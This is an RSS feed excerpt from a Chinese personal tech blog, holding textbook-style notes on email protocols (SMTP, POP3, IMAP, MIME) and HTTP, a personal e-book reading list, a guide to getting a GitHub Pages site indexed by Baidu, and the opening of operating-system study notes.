<ol>
<li>
<p><strong>电子邮件格式</strong></p>
<p><strong>一个电子邮件分为信封和内容两大部分，邮件内容又分为首部和主体两部分</strong>。RFC 822 规定了邮件的首部格式，而邮件的主体部分则让用启自由撰写。用户写好首部后，邮件系统自动地将信封所需的信息提取出来并写在信封上，用户不需要亲自填写信封上的信息。</p>
<p>邮件内容的首部包含一些首部行，每个首部行由一个关键字后跟冒号再后跟值组成。有些关键字是必需的，有些则是可选的。最重要的关键字是 <code>To</code> 和 <code>Subject</code>。</p>
<p><code>To</code> 是必需的关键字，后面填入一个或多个收件人的电子邮件地址。电子邮件地址的规定格式为：<em>收件人邮箱名@邮箱所在主机的域名</em>，如：<code>lisi@163.com</code>，其中收信人邮箱名即用户名，<code>lisi</code> 在 <code>163.com</code> 这个邮件服务器上必须是唯一的。这也就保证了 <code>lisi@163.com</code> 这个邮件地址在整个因特网上是唯一的。</p>
<p><code>Subject</code> 是可选关键字，是邮件的主题，反映了邮件的主要内容。</p>
<p>当然，还有一个必填的关键字是 <code>From</code>，但它通常由邮件系统自动填入。首部与主体之间用一个空行进行分割。</p>
</li>
<li>
<p><strong>多用途网际邮件扩充（MIME）</strong></p>
<p>由于 SMTP 只能传送一定长度的 ASCII 码邮件，许多其他非英语国家的文字（如：中文、俄文，甚至带重音符号的法文或德文）就无法传送，且无法传送可执行文件及其他二进制对象，因此提出了 <strong>多用途网络邮件扩充（Multipurpose Internet Mail Extensions，MIME）</strong>。</p>
<p>MIME 并未改动 SMTP 或取代它。MIME 的意图是继续使用目前的格式，但增加了邮件主体的结构，并定义了传送非 ASCI 码的编码规则。也就是说，MIME 邮件可在现有的电子邮件程序和协议下传送。</p>
<p><strong>MIME 主要包括以下三部分内容：</strong></p>
<ul>
<li><code>5</code> 个新的邮件首部字段，包括 MIME 版本、内容描述、内容标识、传送编码和内容类型</li>
<li>定义了许多邮件内容的格式，对多媒体电子邮件的表示方法进行了标准化</li>
<li>定义了传送编码，可对任何内容格式进行转换，而不会被邮件系统改变</li>
</ul>
</li>
</ol>
<h4> SMTP 和 POP3</h4>
<ol>
<li>
<p><strong>SMTP</strong></p>
<p><strong>简单邮件传输协议（Simple Mail Transfer Protocol，SMTP）</strong> 是一种提供可靠且有效的电子邮件传输的协议，它控制两个相互通信的 SMTP 进程交换信息。由于 SMTP 使用客户/服务器方式，因此负责发送邮件的 SMTP 进程就是 SMTP 客户，而负责接收邮件的 SMTP 进程就是 SMTP 服务器。SMTP 用的是 TCP 连接，端口号为 <code>25</code>。<strong>SMTP 通信有以下三个阶段：</strong></p>
<ul>
<li>
<p><strong>连接建立</strong></p>
<p>发件人的邮件发送到发送方邮件服务器的邮件缓存中后，SMTP 客户就每隔一定时间对邮件缓存扫描一次。如发现有邮件，就使用 SMTP 的熟知端口号（<code>25</code>）与接收方邮件服务器的 SMTP 服务器建立 TCP 连接。连接建立后，接收方 SMTP 服务器发出 <code>220 Service ready</code>（服务就绪）。然后 SMTP 客户向 SMTP 服务器发送 <code>HELO</code> 命令，附上发送方的主机名。</p>
<p>SMTP 不使用中间的邮件服务器。TCP 连接总是在发送方和接收方这两个邮件服务器之间直接建立，而不管它们相隔多远，不管在传送过程中要经过多少个路由器。当接收方邮件服务器因故障暂时不能建立连接时，发送方的邮件服务器只能等待一段时间后再次尝试连接。</p>
</li>
<li>
<p><strong>邮件传送</strong></p>
<p>连接建立后，就可开始传送邮件。邮件的传送从 <code>MAIL</code> 命令开始，<code>MAIL</code> 命令后面有发件人的地址。如：<code>MAIL FROM:&lt;lisi@163.com&gt;</code>。若 SMTP 服务器已准备好接收邮件，则回答 <code>250 OK</code>。接着 SMTP 客户端发送一个或多个 <code>RCPT</code>（收件人 <code>recipient</code> 的缩写）命令，格式为 <code>RCPT TO:&lt;收件人地址&gt;</code>。每发送一个 RCPT 命令，都应有相应的信息从 SMTP 服务器返回，如：<code>250 OK</code> 或 <code>550 No such user here</code>（无此用户）。</p>
<p><code>RCPT</code> 命令的作用是，先弄清接收方系统是否已做好接收邮件的准备，然后才发送邮件，以便不至于发送了很长的邮件后才知道地址错误，进而避免浪费通信资源。</p>
<p>获得 OK 的回答后，客户端就使用 <code>DATA</code> 命令，表示要开始传输邮件的内容。正常情况下，SMTP 服务器回复的信息是 <code>354 Start mail input; end with&lt;CRLF&gt;.&lt;CRLF&gt;</code>。<code>&lt;CRLF&gt;</code> 表示回车换行。此时 SMTP 客户端就可开始传送邮件内容，并用 <code>&lt;CRLF&gt;.&lt;CRLF&gt;</code> 表示邮件内容的结束。</p>
</li>
<li>
<p><strong>连接释放</strong></p>
<p>邮件发送完毕后，SMTP 客户应发送 <code>QUIT</code> 命令。SMTP 服务器返回的信息是 <code>221</code>（服务关闭），表示 SMTP 同意释放 TCP 连接。邮件传送的全部过程就此结束。</p>
</li>
</ul>
</li>
<li>
<p><strong>POP3 和 IMAP</strong></p>
<p><strong>邮局协议（PostOffice Protocol，POP）</strong> 是一个非常简单但功能有限的邮件读取协议，现在使用的是它的第 <code>3</code> 个版本 POP3。POP3 采用的是 “拉”（Pull）的通信方式，当用户读取邮件时，用户代理向邮件服务器发出请求，“拉” 取用户邮箱中的邮件。</p>
<p>POP 也使用客户/服务器的工作方式，在传输层使用 TCP，端口号为 <code>110</code>。接收方的用户代理上必须运行 POP 客户程序，而接收方的邮件服务器上则运行 POP 服务器程序。<strong>POP 有两种工作方式</strong>：“下载并保留” 和 “下载并删除”。在 “下载并保留” 方式下，用户从邮件服务器上读取邮件后，邮件依然会保存在邮件服务器上，用户可再次从服务器上读取该邮件；而使用 “下载并删除” 方式时，邮件一旦被读取，就被从邮件服务器上删除，用户不能再次从服务器上读取。</p>
</li>
</ol>
<p>另一个邮件读取协议是 <strong>因特网报文存取协议（IMAP）</strong>，它比 POP 复杂得多，IMAP 为用户提供了创建文件夹、在不同文件夹之间移动邮件及在远程文件夹中查询邮件等联机命令，为此 IMAP 服务器维护了会话用户的状态信息。IMAP 的另一特性是允许用户代理只获取报文的某些部分，例如：可以只读取一个报文的首部，或多部分 MIME 报文的一部分。这非常适用于低带宽的情况，用户可能并不想取回邮箱中的所有邮件，尤其是包含很多音频或视频的大邮件。</p>
<p>此外，随着万维网的流行，目前出现了很多基于万维网的电子邮件，如：Hotmail、Gmail 等。这种电子邮件的特点是，用户浏览器与 Hotmail 或 Gmail 的邮件服务器之间的邮件发送或接收使用的是 HTTP，而仅在不同邮件服务器之间传送邮件时才使用 SMTP。</p>
<h3> 万维网（WWW）</h3>
<h4> WWW 的概念与组成结构</h4>
<p><strong>万维网（WorldWide Web，WWW）</strong> 是一个分布式、联机式的信息存储空间，在这个空间中：一样有用的事物称为一样 “资源”，并由一个全域 <strong>统一资源定位符（URL）</strong> 标识。这些资源通过 <strong>超文本传输协议（HTTP）</strong> 传送给使用者，而后者通过单击链接来获取资源。</p>
<p>万维网使用链接的方法能非常方便地从因特网上的一个站点访问另一个站点（即 “链接到另一个站点"），从而主动地按需获取丰富的信息。<strong>超文本标记语言（HyperText Markup Language，HTML）</strong> 使得万维网页面的设计者可以很方便地用一个超链接从本页面的某处链接到因特网上的任何一个万维网页面，并能够在自已的计算机屏幕上显示这些页面。</p>
<p><strong>万维网的内核部分是由三个标准构成的：</strong></p>
<ul>
<li><strong>统一资源定位符（URL）</strong>：负责标识万维网上的各种文档，并使每个文档在整个万维网的范围内具有唯一的标识符 URL</li>
<li><strong>超文本传输协议（HTTP）</strong>：一个应用层协议，它使用 TCP 连接进行可靠的传输，HTTP 是万维网客户程序和服务器程序之间交互所必须严格遵守的协议</li>
<li><strong>超文本标记语言（HTML）</strong>：一种文档结构的标记语言，它使用一些约定的标记对页面上的各种信息（包括文字、声音、图像、视频等）、格式进行描述</li>
</ul>
<p>URL 是对可以从因特网上得到的资源的位置和访问方法的一种简洁表示。URL 相当于一个文件名在网络范围的扩展。<strong>URL 的一般形式是</strong>：<code>&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</code>。</p>
<p><code>&lt;协议&gt;</code> 指用什么协议来获取万维网文档，常见的协议有：http、ftp 等；<code>&lt;主机&gt;</code> 是存放资源的主机在因特网中的域名或 IP 地址；<code>&lt;端口&gt;</code> 和 <code>&lt;路径&gt;</code> 有时可省略。在 URL 中不区分大小写。</p>
<p>万维网以客户/服务器方式工作。浏览器是在用户主机上的万维网客户程序，而万维网文档所驻留的主机则运行服务器程序，这台主机称为 <strong>万维网服务器</strong>。客户程序向服务器程序发出请求，服务器程序向客户程序送回客户所要的万维网文档。<strong>工作流程如下：</strong></p>
<ol>
<li>Web 用户使用浏览器（指定 URL）与 Web 服务器建立连接，并发送浏览请求</li>
<li>Web 服务器把 URL 转换为文件路径，并返回信息给 Web 浏览器</li>
<li>通信完成，关闭连接</li>
</ol>
<p>万维网是无数个网络站点和网页的集合，它们在一起构成了因特网最主要的部分（因特网也包括电子邮件、Usenet 和新闻组）。</p>
<h4> 超文本传输协议（HTTP）</h4>
<p>HTTP 定义了浏览器（万维网客户进程）怎样向万维网服务器请求万维网文档，以及服务器怎样把文档传送给浏览器。从层次的角度看，HTTP 是 <strong>面向事务的（Transaction-oriented）</strong> 应用层协议，它规定了在浏览器和服务器之间的请求和响应的格式与规则，是万维网上能够可靠地交换文件（包括文本、声音、图像等各种多媒体文件）的重要基础。</p>
<ol>
<li>
<p><strong>HTTP 的操作过程</strong></p>
<p>从协议执行过程来说，浏览器要访问 WWW 服务器时，首先要完成对 WWW 服务器的域名解析。一旦获得了服务器的 IP 地址，浏览器就通过 TCP 向服务器发送连接建立请求。</p>
<p><strong>万维网的大致工作过程</strong>：每个万维网站点都有一个服务器进程，它不断地监听 TCP 的端口 <code>80</code>（默认），当监听到连接请求后便与浏览器建立 TCP 连接。然后，浏览器就向服务器发送请求获取某个 Web 页面的 HTTP 请求。服务器收到请求后，将构建所请求 Web 页的必需信息，并通过 HTTP 响应返回给浏览器。浏览器再将信息进行解释，然后将 Web 页显示给用户。最后，TCP 连接释放。</p>
<p>在浏览器和服务器之间的请求与响应的交互，必须遵循规定的格式和规则，这些格式和规则就是 HTTP。因此 HTTP 有两类报文：<strong>请求报文</strong>（从 Web 客户端向 Web 服务器发送服务请求）和 <strong>响应报文</strong>（从 Web 服务器对 Web 客户端请求的回答）。</p>
<p><strong>用户单击鼠标后所发生的事件按顺序如下：</strong></p>
<ul>
<li>浏览器分析链接指向页面的 URL（<code>http://www.baidu.com/chn/index.html</code>）</li>
<li>浏览器向 DNS 请求解析 <code>www.baidu.com</code> 的 IP 地址</li>
<li>域名系统 DNS 解析出百度的 IP 地址</li>
<li>浏览器与该服务器建立 TCP 连接（默认端口号为 <code>80</code>）</li>
<li>浏览器发出 HTTP 请求：<code>GET/chn/index.html</code></li>
<li>服务器通过 HTTP 响应把文件 <code>index.html</code> 发送给浏览器</li>
<li>释放 TCP 连接</li>
<li>浏览器解释文件 <code>index.html</code>，并将 Web 页显示给用户</li>
</ul>
</li>
<li>
<p><strong>HTTP 的特点</strong></p>
<p>HTTP 使用 TCP 作为传输层协议，保证了数据的可靠传输。HTTP 不必考虑数据在传输过程中被丢弃后又怎样被重传。但是，HTTP 本身是无连接的（务必注意拖就是说，虽然 HTTP 使用了 TCP 连接，但通信的双方在交换 HTTP 报文之前不需要先建立 HTTP 连接。</p>
<p>HTTP 是无状态的。也就是说，同一个客户第二次访问同一个服务器上的页面时，服务器的响应与第一次被访问时的相同。因为服务器并不记得曾经访问过的这个客户，也不记得为该客户曾经服务过多少次。</p>
<p>HTTP 的无状态特性简化了服务器的设计，使服务器更容易支持大量并发的 HTTP 请求。在实际应用中，通常使用 <code>Cookie</code> 加数据库的方式来跟踪用户的活动（如：记录用户最近浏览的商品等）。<strong>Cookie 的工作原理</strong>：当用户浏览某个使用 <code>Cookie</code> 的网站时，该网站服务器就为用户产生一个唯一的识别码，如：<code>123456</code>，接着在给用户的响应报文中添加一个 <code>Set-cookie</code> 的首部行 <code>Set cookie: 123456</code>。用户收到响应后，就在它管理的特定 <code>Cookie</code> 文件中添加这个服务器的主机名和 <code>Cookie</code> 识别码，当用户继续浏览这个网站时，会取出这个网站的识别码，并放入请求报文的 <code>Cookie</code> 首部行 <code>Cookie: 123456</code>。服务器根据请求报文中的 <code>Cookie</code> 识别码就能从数据库中查询到该用户的活动记录，进而执行一些个性化的工作，如：根据用户的历史浏览记录向其推荐新产品等。</p>
<p>HTTP 既可以使用非持久连接，也可以使用持久连接（HTTP/1.1 支持）。</p>
<p>对于非持久连接，每个网页元素对象（如：JPEG 图形、Flash 等）的传输都需要单独建立一个 TCP 连接。请求一个万维网文档所需的时间是该文档的传输时间（与文档大小成正比）加上两倍往返时间 RTT（一个 RTT 用于 TCP 连接，另一个 RTT 用于请求和接收文档）。每个对象引用都导致 <code>2 × RTT</code> 的开销，此外每次建立新的 TCP 连接都要分配缓存和变量，使万维网服务器的负担很重。</p>
<p>所谓持久连接，是指万维网服务器在发送响应后仍然保持这条连接，使同一个客户（浏览器）和该服务器可以继续在这条连接上传送后续的 HTTP 请求和响应报文。</p>
<p><strong>持久连接又分为非流水线和流水线两种方式</strong>。对于非流水线方式，客户在收到前一个响应后才能发出下一个请求，服务器发送完一个对象后其 TCP 连接就处于空闲状态，浪费了服务器资源。HTTP/1.1 的默认方式是使用流水线的持久连接，这种情况下，客户每遇到一个对象引用就立即发出一个请求，因而客户可以逐个地连续发出对各个引用对象的请求。如果所有的请求和响应都是连续发送的，那么所有引用的对象共计经历 <code>1</code> 个 <code>RTT</code> 延迟，而不是像非流水线方式那样，每个引用都必须有 <code>1</code> 个 <code>RTT</code> 延迟。这种方式减少了 TCP 连接中的空闲时间，提高了效率。</p>
</li>
<li>
<p><strong>HTTP 的报文结构</strong></p>
<p>HTTP 是 <strong>面向文本的（Text-Oriented）</strong>，因此报文中的每个字段都是一些 ASCII 码串，并且每个字段的长度都是不确定的。有两类 HTTP 报文：</p>
<ul>
<li><strong>请求报文</strong>：从客户向服务器发送的请求报文</li>
<li><strong>响应报文</strong>：从服务器到客户的回答</li>
</ul>
<p>HTTP 请求报文和响应报文都由三个部分组成。这两种报文格式的区别就是开始行不同。</p>
<ul>
<li>
<p><strong>开始行</strong>：用于区分是请求报文还是响应报文。在请求报文中的开始行称为 <strong>请求行</strong>，而在响应报文中的开始行称为 <strong>状态行</strong>。开始行的三个字段之间都以空格分隔，最后的 “CR” 和 “LF” 分别代表 “回车” 和 “换行”。请求报文的 “请求行” 有三个内容：方法、请求资源的 URL 及 HTTP 的版本。其中，“方法” 是对所请求对象进行的操作，这些方法实际上也就是一些命令。下表给出了 <strong>HTTP 请求报文中常用的几个方法：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">方法（操作）</th>
<th style="text-align:center">意义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">请求读取由 URL 标识的信息</td>
</tr>
<tr>
<td style="text-align:center">HEAD</td>
<td style="text-align:center">请求读取由 URL 标识的信息的首部</td>
</tr>
<tr>
<td style="text-align:center">POST</td>
<td style="text-align:center">给服务器添加信息（如：注释）</td>
</tr>
<tr>
<td style="text-align:center">CONNECT</td>
<td style="text-align:center">用于代理服务器</td>
</tr>
</tbody>
</table>
</li>
<li>
<p><strong>首部行</strong>：用来说明浏览器、服务器或报文主体的一些信息。首部可以有几行，但也可以不使用。在每个首部行中都有首部字段名和它的值，每一行在结束的地方都要有 “回车” 和 “换行”。整个首部行结束时，还有一空行将首部行和后面的实体主体分开</p>
</li>
<li>
<p><strong>实体主体</strong>：在请求报文中一般不用这个字段，而在响应报文中也可能没有这个字段</p>
</li>
</ul>
</li>
</ol>
<p><strong>常见应用层协议如下表所示：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">应用程序</th>
<th style="text-align:center">FTP 数据连接</th>
<th style="text-align:center">FTP 控制连接</th>
<th style="text-align:center">TELNET</th>
<th style="text-align:center">SMTP</th>
<th style="text-align:center">DNS</th>
<th style="text-align:center">TFTP</th>
<th style="text-align:center">HTTP</th>
<th style="text-align:center">POP3</th>
<th style="text-align:center">SNMP</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">使用协议</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">UDP</td>
<td style="text-align:center">UDP</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">UDP</td>
</tr>
<tr>
<td style="text-align:center">熟知端口号</td>
<td style="text-align:center">20</td>
<td style="text-align:center">21</td>
<td style="text-align:center">23</td>
<td style="text-align:center">25</td>
<td style="text-align:center">53</td>
<td style="text-align:center">69</td>
<td style="text-align:center">80</td>
<td style="text-align:center">110</td>
<td style="text-align:center">161</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>书籍</title>
      <link>https://sankgao.github.io/others/books.html</link>
      <guid>https://sankgao.github.io/others/books.html</guid>
      <source url="https://sankgao.github.io/rss.xml">书籍</source>
      <description>以下均为电子书籍。 计算机 [x] 《王道 2024 计算机组成原理》; [x] 《王道 2024 操作系统》; [ ] 《王道 2024 计算机网络》; [ ] 《王道 2024 数据结构》; [x] 《零基础学 Python（全彩版）》; [x] 《看漫画学 Python：有趣、有料、好玩、好用（全彩版）》; [x] 《漫画算法：小灰的算法之旅（P...</description>
      <category>其它</category>
      <pubDate>Fri, 15 Sep 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>以下均为电子书籍。</p>
<h2> 计算机</h2>
<ul class="task-list-container">
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-0" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-0"> 《王道 2024 计算机组成原理》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-1" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-1"> 《王道 2024 操作系统》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-2" disabled="disabled"><label class="task-list-item-label" for="task-item-2"> 《王道 2024 计算机网络》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-3" disabled="disabled"><label class="task-list-item-label" for="task-item-3"> 《王道 2024 数据结构》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-4" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-4"> 《零基础学 Python（全彩版）》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-5" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-5"> 《看漫画学 Python：有趣、有料、好玩、好用（全彩版）》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-6" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-6"> 《漫画算法：小灰的算法之旅（Python 篇）》</label></li>
</ul>
<h2> 文学</h2>
<ul class="task-list-container">
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-7" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-7"> 《活着》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-8" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-8"> 《许三观卖血记》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-9" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-9"> 《在细雨中呼喊》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-10" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-10"> 《兄弟》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-11" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-11"> 《酒国》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-12" disabled="disabled"><label class="task-list-item-label" for="task-item-12"> 《朝花夕拾》</label></li>
</ul>
<h2> 小说</h2>
<ul class="task-list-container">
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-13" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-13"> 《斗罗大陆》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-14" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-14"> 《斗罗大陆Ⅱ绝世唐门》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-15" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-15"> 《斗罗大陆Ⅲ龙王传说》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-16" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-16"> 《斗罗大陆Ⅳ终极斗罗》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-17" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-17"> 《斗罗大陆Ⅴ重生唐三》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-18" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-18"> 《天珠变》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-19" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-19"> 《善良的死神》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-20" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-20"> 《遮天》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-21" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-21"> 《完美世界》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-22" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-22"> 《圣墟》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-23" disabled="disabled"><label class="task-list-item-label" for="task-item-23"> 《神墓》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-24" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-24"> 《凡人修仙传》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-25" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-25"> 《凡人修仙之仙界篇》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-26" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-26"> 《斗破苍穹》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-27" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-27"> 《武动乾坤》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-28" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-28"> 《大主宰》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-29" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-29"> 《元尊》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-30" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-30"> 《仙逆》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-31" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-31"> 《一念永恒》</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-32" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-32"> 《绝世武神》</label></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>百度收录 GitHub Pages 博客</title>
      <link>https://sankgao.github.io/about/blog/baidu_seo.html</link>
      <guid>https://sankgao.github.io/about/blog/baidu_seo.html</guid>
      <source url="https://sankgao.github.io/rss.xml">百度收录 GitHub Pages 博客</source>
      <description>由于本博客部署在 GitHub Pages 上，而 Github 禁止了百度爬取。故将博客添加到百度收录 SEO 中，增强网站的访问 查看网站是否收录 在百度中输入 site: 查看网站是否收录。 例如：site:sankgao.github.io 添加网站 1. 登陆 百度资源搜索平台 (https://ziyuan.baidu.com/) 2. 点...</description>
      <category>About</category>
      <pubDate>Fri, 15 Sep 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>由于本博客部署在 GitHub Pages 上，而 Github 禁止了百度爬取。故将博客添加到百度收录 SEO 中，增强网站的访问</p>
</div>
<h2> 查看网站是否收录</h2>
<p>在百度中输入 <code>site:&lt;域名&gt;</code> 查看网站是否收录。</p>
<p>例如：<code>site:sankgao.github.io</code></p>
<h2> 添加网站</h2>
<ol>
<li>
<p>登陆 <a href="https://ziyuan.baidu.com/" target="_blank" rel="noopener noreferrer">百度资源搜索平台</a></p>
</li>
<li>
<p>点击 <strong>用户中心 -&gt; 站点管理</strong> 添加网站</p>
<figure><figcaption>添加网站</figcaption></figure>
</li>
<li>
<p>选择站点属性</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>站点验证成功后，站点领域信息 30 天内只能修改一次，请谨慎设置！</p>
</div>
</li>
<li>
<p>验证网站</p>
<p>验证网站有两种方式，选择一个验证方式，根据提示完成验证。</p>
<ul>
<li>
<p><strong>文件验证</strong></p>
<figure><figcaption>文件验证</figcaption></figure>
</li>
<li>
<p><strong>HTML 标签验证</strong></p>
<figure><figcaption>HTML 标签验证</figcaption></figure>
</li>
</ul>
</li>
</ol>
<h2> 博客中添加验证代码</h2>
<p>本人选择的是 HTML 标签验证，在博客中添加上述代码。</p>
<p><a href="https://theme-hope.vuejs.press/zh/guide/advanced/seo.html#%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0-head-%E6%A0%87%E7%AD%BE" target="_blank" rel="noopener noreferrer">博客主题</a> 提供了在页面的 <code>frontmatter</code> 中配置 <code>head</code> 选项，自主添加特定标签到页面 <code>&lt;head&gt;</code>，会自动注入 <code>&lt;meta name="keywords" content="SEO plugin" /&gt;</code>。</p>
<p>所以将下面代码添加到网站根目录下的 <code>README</code> 文件中（docs/README.md）：</p>
<div class="language-markdown line-numbers-mode" data-ext="md"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>操作系统</title>
      <link>https://sankgao.github.io/computers/base/operating_system.html</link>
      <guid>https://sankgao.github.io/computers/base/operating_system.html</guid>
      <source url="https://sankgao.github.io/rss.xml">操作系统</source>
      <description>计算机系统概述 操作系统的基本概念 操作系统的概念 在信息化时代，软件是计算机系统的灵魂，而作为软件核心的操作系统，已与现代计算机系统密不可分、融为一体。计算机系统自下而上可大致分为四部分：硬件、操作系统、应用程序和用户（这里的划分与 计算机组成 (./computer_organization.md/#计算机系统层次结构) 中的分层不同）。操作系统管...</description>
      <category>Computer</category>
      <pubDate>Fri, 15 Sep 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 计算机系统概述</h2>
<h3> 操作系统的基本概念</h3>
<h4> 操作系统的概念</h4>
<p>在信息化时代，软件是计算机系统的灵魂，而作为软件核心的操作系统，已与现代计算机系统密不可分、融为一体。<strong>计算机系统自下而上可大致分为四部分</strong>：硬件、操作系统、应用程序和用户（这里的划分与 <a href="/computers/base/computer_organization.md/#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84" target="blank">计算机组成</a> 中的分层不同）。操作系统管理各种计算机硬件，为应用程序提供基础，并充当计算机硬件与用户之间的中介。</p>
<p><strong>硬件</strong> 如：中央处理器、内存、输入/输出设备等，提供基本的计算资源。<strong>应用程序</strong> 如：字处理程序、电子制表软件、编译器、网络浏览器等，规定按何种方式使用这些资源来解决用户的计算问题。</p>
<p>操作系统控制和协调各用户的应用程序对硬件的分配与使用。在计算机系统的运行过程中，操作系统提供了正确使用这些资源的方法。</p>
<p>操作系统（Operating System，OS）是 <strong>控制和管理整个计算机系统的硬件与软件资源，合理地组织、调度计算机的工作与资源的分配，进而为用户和其他软件提供方便接口与环境的程序集合</strong> 。操作系统是计算机系统中最基本的系统软件。</p>
<h4> 操作系统的特征</h4>
<p>操作系统是一种系统软件。<strong>操作系统的基本特征</strong> 包括并发、共享、虚拟和异步。</p>
<ol>
<li>
<p><strong>并发（Concurrence）</strong></p>
<p>并发是指 <strong>在同一时间间隔内发生两个或多个事件</strong>。操作系统的 <strong>并发性</strong> 是指计算机系统中同时存在多个运行的程序，因此它具有处理和调度多个程序同时执行的能力。在操作系统中，引入进程的目的是使程序能并发执行。</p>
<div class="hint-container tip">
<p class="hint-container-title">同一时间间隔（并发）和同一时刻（并行）的区别</p>
<p>在多道程序环境下，一段时间内，宏观上有多道程序在同时执行，而在每个时刻，单处理机环境下实际仅能有一道程序执行，因此微观上这些程序仍是分时交替执行的。操作系统的并发性是通过分时得以实现的</p>
</div>
<p><strong>并行性</strong> 是指系统具有同时进行运算或操作的特性，在同一时刻能完成两种或两种以上的工作。并行性需要有相关硬件的支持，如：多流水线或多处理机硬件环境。</p>
